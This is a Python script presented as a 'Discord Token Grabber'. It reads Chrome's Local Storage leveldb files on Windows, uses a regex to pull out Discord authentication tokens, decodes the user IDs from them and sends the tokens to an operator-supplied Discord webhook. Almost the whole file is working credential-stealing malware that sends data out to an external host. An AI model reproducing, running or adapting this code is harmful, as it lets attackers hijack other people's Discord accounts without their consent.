import os
import re
import base64
import json
import typing
import urllib.request

print ("Discord Token Grabber | Made by YN0t9 on GitHub")

# Regex pattern to identify potential Discord tokens
TOKEN_REGEX_PATTERN = r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{34,38}"

# User-Agent for HTTP requests
USER_AGENT = "Mozilla/5.0 (X11; U; Linux i686) Gecko/20071127 Firefox/2.0.0.11"

# Webhook URL for sending data
WEBHOOK_URL = "https://discord.com/api/webhooks/YOUR_WEBHOOK_HERE" # Update Webhook URL to your own. This wont work else.

def send_to_webhook(webhook_url: str, payload: dict) -> None:
    """
    Send a payload to the specified Discord webhook.

    Args:
        webhook_url (str): The Discord webhook URL.
        payload (dict): The payload to send as JSON.
    """
    try:
        request = urllib.request.Request(
            webhook_url,
            data=json.dumps(payload).encode('utf-8'),
            headers={"Content-Type": "application/json", "User-Agent": USER_AGENT},
            method="POST"
        )
        with urllib.request.urlopen(request) as response:
            print(f"Webhook response: {response.status} {response.reason}")
    except Exception as e:
        print(f"Failed to send to webhook: {e}")

def get_tokens_from_file(file_path: str) -> typing.Optional[list[str]]:
    """
    Extract potential tokens from a given file.

    Args:
        file_path (str): The path to the file to scan.

    Returns:
        list[str] | None: List of tokens found, or None if no tokens are found.
    """
    try:
        with open(file_path, encoding="utf-8", errors="ignore") as file:
            content = file.read()
    except (PermissionError, FileNotFoundError):
        return None

    tokens = re.findall(TOKEN_REGEX_PATTERN, content)
    return tokens if tokens else None

def decode_user_id_from_token(token: str) -> typing.Optional[str]:
    """
    Attempt to decode the user ID portion of a Discord token.

    Args:
        token (str): The suspected Discord token.

    Returns:
        str | None: Decoded user ID if successful, None otherwise.
    """
    try:
        user_id_encoded = token.split(".", maxsplit=1)[0]
        user_id = base64.b64decode(user_id_encoded + "==").decode("utf-8")
        return user_id
    except (UnicodeDecodeError, IndexError, base64.binascii.Error):
        return None

def scan_directory_for_tokens(directory_path: str) -> dict[str, set[str]]:
    """
    Scan a directory for potential Discord tokens grouped by user IDs.

    Args:
        directory_path (str): Path to the directory to scan.

    Returns:
        dict[str, set[str]]: A dictionary mapping user IDs to sets of tokens.
    """
    tokens_by_user_id = {}

    try:
        for filename in os.listdir(directory_path):
            file_path = os.path.join(directory_path, filename)

            tokens = get_tokens_from_file(file_path)
            if not tokens:
                continue

            for token in tokens:
                user_id = decode_user_id_from_token(token)
                if not user_id:
                    continue

                if user_id not in tokens_by_user_id:
                    tokens_by_user_id[user_id] = set()

                tokens_by_user_id[user_id].add(token)
    except FileNotFoundError:
        print(f"Directory not found: {directory_path}")
    except PermissionError:
        print(f"Permission denied: {directory_path}")

    return tokens_by_user_id

def display_tokens(tokens_by_user_id: dict[str, set[str]]) -> None:
    """
    Display the collected tokens in a human-readable format.

    Args:
        tokens_by_user_id (dict): Dictionary of user IDs and their associated tokens.
    """
    for user_id, tokens in tokens_by_user_id.items():
        print(f"User ID: {user_id}")
        for token in tokens:
            print(f"  Token: {token}")

    if not tokens_by_user_id:
        print("No tokens found.")

def main():
    """
    Main function to initiate the token scanning process.
    """
    # Example directory to scan (adjust path as needed)
    chrome_local_storage_path = os.path.join(
        os.getenv("LOCALAPPDATA", ""),
        r"Google\Chrome\User Data\Default\Local Storage\leveldb"
    )

    print("Scanning for tokens...")
    tokens_by_user_id = scan_directory_for_tokens(chrome_local_storage_path)

    if tokens_by_user_id:
        # Prepare payload for the webhook
        payload = {
            "content": "Tokens found:",
            "embeds": [
                {
                    "fields": [
                        {"name": user_id, "value": "\n".join(tokens)}
                        for user_id, tokens in tokens_by_user_id.items()
                    ]
                }
            ]
        }
        send_to_webhook(WEBHOOK_URL, payload)
    else:
        print("No tokens to send.")

if __name__ == "__main__":
    main()
